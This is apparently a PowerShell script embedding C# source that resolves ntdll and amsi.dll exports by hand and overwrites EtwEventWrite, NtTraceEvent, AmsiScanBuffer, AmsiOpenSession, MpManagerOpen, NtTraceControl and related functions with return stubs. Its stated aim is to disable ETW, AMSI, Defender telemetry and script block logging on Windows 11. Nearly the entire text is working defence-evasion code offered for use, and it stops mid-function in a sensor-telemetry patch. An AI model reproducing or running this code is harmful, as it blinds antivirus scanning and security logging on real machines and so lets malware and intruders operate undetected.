$Source = @"
using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;

public class PEReader
{
    public struct IMAGE_DOS_HEADER
    {
        public UInt16 e_magic;
        public UInt16 e_cblp;
        public UInt16 e_cp;
        public UInt16 e_crlc;
        public UInt16 e_cparhdr;
        public UInt16 e_minalloc;
        public UInt16 e_maxalloc;
        public UInt16 e_ss;
        public UInt16 e_sp;
        public UInt16 e_csum;
        public UInt16 e_ip;
        public UInt16 e_cs;
        public UInt16 e_lfarlc;
        public UInt16 e_ovno;
        public UInt16 e_res_0;
        public UInt16 e_res_1;
        public UInt16 e_res_2;
        public UInt16 e_res_3;
        public UInt16 e_oemid;
        public UInt16 e_oeminfo;
        public UInt16 e_res2_0;
        public UInt16 e_res2_1;
        public UInt16 e_res2_2;
        public UInt16 e_res2_3;
        public UInt16 e_res2_4;
        public UInt16 e_res2_5;
        public UInt16 e_res2_6;
        public UInt16 e_res2_7;
        public UInt16 e_res2_8;
        public UInt16 e_res2_9;
        public UInt32 e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER32
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt32 BaseOfData;
        public UInt32 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt32 SizeOfStackReserve;
        public UInt32 SizeOfStackCommit;
        public UInt32 SizeOfHeapReserve;
        public UInt32 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;
        [FieldOffset(8)]
        public UInt32 VirtualSize;
        [FieldOffset(12)]
        public UInt32 VirtualAddress;
        [FieldOffset(16)]
        public UInt32 SizeOfRawData;
        [FieldOffset(20)]
        public UInt32 PointerToRawData;
        [FieldOffset(24)]
        public UInt32 PointerToRelocations;
        [FieldOffset(28)]
        public UInt32 PointerToLinenumbers;
        [FieldOffset(32)]
        public UInt16 NumberOfRelocations;
        [FieldOffset(34)]
        public UInt16 NumberOfLinenumbers;
        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string Section
        {
            get { 
                int i = Name.Length - 1;
                while (Name[i] == 0) {
                    --i;
                }
                char[] NameCleaned = new char[i+1];
                Array.Copy(Name, NameCleaned, i+1);
                return new string(NameCleaned); 
            }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_BASE_RELOCATION
    {
        public uint VirtualAdress;
        public uint SizeOfBlock;
    }

    [Flags]
    public enum DataSectionFlags : uint
    {
        Stub = 0x00000000,
    }

    private IMAGE_DOS_HEADER dosHeader;
    private IMAGE_FILE_HEADER fileHeader;
    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
    private IMAGE_SECTION_HEADER[] imageSectionHeaders;
    private byte[] rawbytes;

    public PEReader(string filePath)
    {
        using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }
            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }
            rawbytes = System.IO.File.ReadAllBytes(filePath);
        }
    }

    public PEReader(byte[] fileBytes)
    {
        using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
        {
            BinaryReader reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
            UInt32 ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (this.Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }
            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }
            rawbytes = fileBytes;
        }
    }

    public static T FromBinaryReader<T>(BinaryReader reader)
    {
        byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));
        GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
        T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
        handle.Free();
        return theStructure;
    }

    public bool Is32BitHeader
    {
        get
        {
            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
    }

    public IMAGE_FILE_HEADER FileHeader
    {
        get { return fileHeader; }
    }

    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
    {
        get { return optionalHeader32; }
    }

    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
    {
        get { return optionalHeader64; }
    }

    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
    {
        get { return imageSectionHeaders; }
    }

    public byte[] RawBytes
    {
        get { return rawbytes; }
    }
}

public class Dynavoke {
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtProtectVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        UInt32 NewProtect,
        ref UInt32 OldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtWriteVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        IntPtr Buffer,
        UInt32 NumberOfBytesToWrite,
        ref UInt32 NumberOfBytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtReadVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        IntPtr Buffer,
        UInt32 NumberOfBytesToRead,
        ref UInt32 NumberOfBytesRead);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtQueryInformationProcessDelegate(
        IntPtr ProcessHandle,
        int ProcessInformationClass,
        IntPtr ProcessInformation,
        uint ProcessInformationLength,
        ref uint ReturnLength);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        UInt32 AllocationType,
        UInt32 Protect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtFreeVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        UInt32 FreeType);

    private static IntPtr NTDLLBaseAddress = IntPtr.Zero;
    private static Dictionary<string, IntPtr> ExportCache = new Dictionary<string, IntPtr>();

    public static IntPtr GetNTDLLBase() {
        if (NTDLLBaseAddress == IntPtr.Zero) {
            NTDLLBaseAddress = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
        }
        return NTDLLBaseAddress;
    }

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
        string cacheKey = ModuleBase.ToString() + "_" + ExportName;
        if (ExportCache.ContainsKey(cacheKey)) {
            return ExportCache[cacheKey];
        }

        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 ExportSize = Marshal.ReadInt32((IntPtr)(pExport + 4));
            if (ExportRVA == 0) return IntPtr.Zero;

            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);

                    // Handle forwarded exports
                    if (FunctionRVA >= ExportRVA && FunctionRVA < ExportRVA + ExportSize) {
                        string forwardedName = Marshal.PtrToStringAnsi(FunctionPtr);
                        if (!string.IsNullOrEmpty(forwardedName) && forwardedName.Contains(".")) {
                            string[] parts = forwardedName.Split('.');
                            string forwardedDll = parts[0] + ".dll";
                            string forwardedFunc = parts[1];
                            
                            IntPtr forwardedModule = IntPtr.Zero;
                            try {
                                ProcessModule fwdMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                                    .Where(x => forwardedDll.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                                    .FirstOrDefault();
                                forwardedModule = fwdMod != null ? fwdMod.BaseAddress : IntPtr.Zero;
                            } catch { }
                            
                            if (forwardedModule != IntPtr.Zero) {
                                FunctionPtr = GetExportAddress(forwardedModule, forwardedFunc);
                            }
                        }
                    }
                    break;
                }
            }
        }
        catch {
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (FunctionPtr != IntPtr.Zero) {
            ExportCache[cacheKey] = FunctionPtr;
        }
        return FunctionPtr;
    }

    public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect) {
        OldProtect = 0;
        object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };

        IntPtr NTDLLHandleInMemory = GetNTDLLBase();
        IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, "NtProtectVirtualMemory");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(NtProtectVirtualMemoryDelegate));
        UInt32 NTSTATUSResult = (UInt32)funcDelegate.DynamicInvoke(funcargs);

        if (NTSTATUSResult != 0x00000000) {
            return false;
        }
        OldProtect = (UInt32)funcargs[4];
        return true;
    }

    public static bool NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, ref UInt32 NumberOfBytesWritten) {
        NumberOfBytesWritten = 0;
        IntPtr bufferPtr = Marshal.AllocHGlobal(Buffer.Length);
        Marshal.Copy(Buffer, 0, bufferPtr, Buffer.Length);
        
        object[] funcargs = { ProcessHandle, BaseAddress, bufferPtr, (UInt32)Buffer.Length, NumberOfBytesWritten };

        IntPtr NTDLLHandleInMemory = GetNTDLLBase();
        IntPtr pNTWVM = GetExportAddress(NTDLLHandleInMemory, "NtWriteVirtualMemory");
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTWVM, typeof(NtWriteVirtualMemoryDelegate));
        UInt32 NTSTATUSResult = (UInt32)funcDelegate.DynamicInvoke(funcargs);
        
        Marshal.FreeHGlobal(bufferPtr);

        if (NTSTATUSResult != 0x00000000) {
            return false;
        }
        NumberOfBytesWritten = (UInt32)funcargs[4];
        return true;
    }

    public static IntPtr GetPEB() {
        IntPtr NTDLLHandleInMemory = GetNTDLLBase();
        IntPtr pNTQIP = GetExportAddress(NTDLLHandleInMemory, "NtQueryInformationProcess");
        
        int pbiSize = IntPtr.Size == 8 ? 48 : 24;
        IntPtr pbi = Marshal.AllocHGlobal(pbiSize);
        uint returnLength = 0;
        
        object[] funcargs = { (IntPtr)(-1), 0, pbi, (uint)pbiSize, returnLength };
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTQIP, typeof(NtQueryInformationProcessDelegate));
        UInt32 NTSTATUSResult = (UInt32)funcDelegate.DynamicInvoke(funcargs);
        
        IntPtr pebAddress = IntPtr.Zero;
        if (NTSTATUSResult == 0) {
            if (IntPtr.Size == 8) {
                pebAddress = Marshal.ReadIntPtr(pbi, 8);
            } else {
                pebAddress = Marshal.ReadIntPtr(pbi, 4);
            }
        }
        
        Marshal.FreeHGlobal(pbi);
        return pebAddress;
    }
}

public class PatchAMSIAndETW26H1 {

    private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
        return Dynavoke.GetExportAddress(ModuleBase, ExportName);
    }

    // Windows 11 26H1 ETW patch - handles new ETW architecture
    private static void PatchETW() {
        try {
            IntPtr CurrentProcessHandle = new IntPtr(-1);
            IntPtr libPtr = Dynavoke.GetNTDLLBase();
            
            byte[] patchbyte = new byte[0];
            if (IntPtr.Size == 4) {
                // x86: xor eax,eax; ret 0x14
                string patchbytestring2 = "33,c0,c2,14,00";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            } else {
                // x64: xor rax,rax; ret
                string patchbytestring2 = "48,33,C0,C3";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            
            // Patch EtwEventWrite
            IntPtr funcPtr = GetExportAddress(libPtr, "EtwEventWrite");
            if (funcPtr != IntPtr.Zero) {
                IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                UInt32 oldProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                UInt32 newProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
            }
            
            // Patch EtwEventWriteFull (26H1 new function)
            IntPtr funcPtr2 = GetExportAddress(libPtr, "EtwEventWriteFull");
            if (funcPtr2 != IntPtr.Zero) {
                IntPtr patchbyteLength2 = new IntPtr(patchbyte.Length);
                UInt32 oldProtect2 = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr2, ref patchbyteLength2, 0x40, ref oldProtect2);
                Marshal.Copy(patchbyte, 0, funcPtr2, patchbyte.Length);
                UInt32 newProtect2 = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr2, ref patchbyteLength2, oldProtect2, ref newProtect2);
            }
            
            // Patch EtwEventWriteEx (enhanced ETW in 26H1)
            IntPtr funcPtr3 = GetExportAddress(libPtr, "EtwEventWriteEx");
            if (funcPtr3 != IntPtr.Zero) {
                IntPtr patchbyteLength3 = new IntPtr(patchbyte.Length);
                UInt32 oldProtect3 = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr3, ref patchbyteLength3, 0x40, ref oldProtect3);
                Marshal.Copy(patchbyte, 0, funcPtr3, patchbyte.Length);
                UInt32 newProtect3 = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr3, ref patchbyteLength3, oldProtect3, ref newProtect3);
            }
            
            // Patch EtwEventWriteTransfer
            IntPtr funcPtr4 = GetExportAddress(libPtr, "EtwEventWriteTransfer");
            if (funcPtr4 != IntPtr.Zero) {
                IntPtr patchbyteLength4 = new IntPtr(patchbyte.Length);
                UInt32 oldProtect4 = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr4, ref patchbyteLength4, 0x40, ref oldProtect4);
                Marshal.Copy(patchbyte, 0, funcPtr4, patchbyte.Length);
                UInt32 newProtect4 = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr4, ref patchbyteLength4, oldProtect4, ref newProtect4);
            }
            
            // Patch NtTraceEvent (kernel ETW)
            IntPtr funcPtr5 = GetExportAddress(libPtr, "NtTraceEvent");
            if (funcPtr5 != IntPtr.Zero) {
                byte[] ntPatch = IntPtr.Size == 4 
                    ? new byte[] { 0x33, 0xC0, 0xC2, 0x10, 0x00 }
                    : new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
                IntPtr patchbyteLength5 = new IntPtr(ntPatch.Length);
                UInt32 oldProtect5 = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr5, ref patchbyteLength5, 0x40, ref oldProtect5);
                Marshal.Copy(ntPatch, 0, funcPtr5, ntPatch.Length);
                UInt32 newProtect5 = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr5, ref patchbyteLength5, oldProtect5, ref newProtect5);
            }
            
            Console.WriteLine("[+++] ETW SUCCESSFULLY PATCHED (26H1 Enhanced)!");
        } catch (Exception e) {
            Console.WriteLine("[-] ETW Patch Error: {0}", e.Message);
        }
    }

    // Windows 11 26H1 AMSI patch - handles new AMSI architecture
    private static void PatchAMSI() {
        try {
            IntPtr CurrentProcessHandle = new IntPtr(-1);
            
            // Standard AMSI patch bytes - returns AMSI_RESULT_CLEAN
            byte[] patchbyte = new byte[0];
            if (IntPtr.Size == 4) {
                // x86: mov eax, 0x80070057; ret 0x18
                string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            } else {
                // x64: mov eax, 0x80070057; ret
                string patchbytestring2 = "B8,57,00,07,80,C3";
                string[] patchbytestring = patchbytestring2.Split(',');
                patchbyte = new byte[patchbytestring.Length];
                for (int i = 0; i < patchbytestring.Length; i++) {
                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                }
            }
            
            IntPtr libPtr = IntPtr.Zero;
            try { 
                ProcessModule amsiMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                    .Where(x => "amsi.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                    .FirstOrDefault();
                libPtr = amsiMod != null ? amsiMod.BaseAddress : IntPtr.Zero; 
            } catch { libPtr = IntPtr.Zero; }
            
            if (libPtr != IntPtr.Zero) {
                // Patch AmsiScanBuffer
                IntPtr funcPtr = GetExportAddress(libPtr, "AmsiScanBuffer");
                if (funcPtr != IntPtr.Zero) {
                    IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                    UInt32 oldProtect = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                    Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                    UInt32 newProtect = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                }
                
                // Patch AmsiScanString
                IntPtr funcPtr2 = GetExportAddress(libPtr, "AmsiScanString");
                if (funcPtr2 != IntPtr.Zero) {
                    IntPtr patchbyteLength2 = new IntPtr(patchbyte.Length);
                    UInt32 oldProtect2 = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr2, ref patchbyteLength2, 0x40, ref oldProtect2);
                    Marshal.Copy(patchbyte, 0, funcPtr2, patchbyte.Length);
                    UInt32 newProtect2 = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr2, ref patchbyteLength2, oldProtect2, ref newProtect2);
                }
                
                // Patch AmsiOpenSession (26H1)
                byte[] sessionPatch = IntPtr.Size == 4 
                    ? new byte[] { 0x33, 0xC0, 0xC2, 0x08, 0x00 }
                    : new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
                IntPtr funcPtr3 = GetExportAddress(libPtr, "AmsiOpenSession");
                if (funcPtr3 != IntPtr.Zero) {
                    IntPtr patchbyteLength3 = new IntPtr(sessionPatch.Length);
                    UInt32 oldProtect3 = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr3, ref patchbyteLength3, 0x40, ref oldProtect3);
                    Marshal.Copy(sessionPatch, 0, funcPtr3, sessionPatch.Length);
                    UInt32 newProtect3 = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr3, ref patchbyteLength3, oldProtect3, ref newProtect3);
                }
                
                Console.WriteLine("[+++] AMSI SUCCESSFULLY PATCHED!");
            } else {
                Console.WriteLine("[*] AMSI.DLL IS NOT LOADED - SKIPPING");
            }
        } catch (Exception e) {
            Console.WriteLine("[-] AMSI Patch Error: {0}", e.Message);
        }
    }

    // Windows 11 26H1 - Patch Windows Defender telemetry
    private static void PatchDefenderTelemetry() {
        try {
            IntPtr CurrentProcessHandle = new IntPtr(-1);
            
            // Patch MpClient.dll if loaded (Defender client)
            IntPtr mpClientPtr = IntPtr.Zero;
            try {
                ProcessModule mpMod = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                    .Where(x => "mpclient.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                    .FirstOrDefault();
                mpClientPtr = mpMod != null ? mpMod.BaseAddress : IntPtr.Zero;
            } catch { }
            
            if (mpClientPtr != IntPtr.Zero) {
                byte[] retPatch = IntPtr.Size == 4 
                    ? new byte[] { 0x33, 0xC0, 0xC2, 0x04, 0x00 }
                    : new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
                    
                IntPtr funcPtr = GetExportAddress(mpClientPtr, "MpManagerOpen");
                if (funcPtr != IntPtr.Zero) {
                    IntPtr patchbyteLength = new IntPtr(retPatch.Length);
                    UInt32 oldProtect = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                    Marshal.Copy(retPatch, 0, funcPtr, retPatch.Length);
                    UInt32 newProtect = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                }
                Console.WriteLine("[+++] DEFENDER TELEMETRY PATCHED!");
            }
        } catch (Exception e) {
            Console.WriteLine("[-] Defender Telemetry Patch Error: {0}", e.Message);
        }
    }

    // Windows 11 26H1 - Patch Script Block Logging
    private static void PatchScriptBlockLogging() {
        try {
            IntPtr CurrentProcessHandle = new IntPtr(-1);
            IntPtr ntdll = Dynavoke.GetNTDLLBase();
            
            // Patch NtTraceControl for script block logging
            byte[] retPatch = IntPtr.Size == 4 
                ? new byte[] { 0x33, 0xC0, 0xC2, 0x18, 0x00 }
                : new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
                
            IntPtr funcPtr = GetExportAddress(ntdll, "NtTraceControl");
            if (funcPtr != IntPtr.Zero) {
                IntPtr patchbyteLength = new IntPtr(retPatch.Length);
                UInt32 oldProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                Marshal.Copy(retPatch, 0, funcPtr, retPatch.Length);
                UInt32 newProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                Console.WriteLine("[+++] SCRIPT BLOCK LOGGING PATCHED!");
            }
        } catch (Exception e) {
            Console.WriteLine("[-] Script Block Logging Patch Error: {0}", e.Message);
        }
    }

    // Windows 11 26H1 - Disable Sensor framework telemetry
    private static void PatchSensorTelemetry() {
        try {
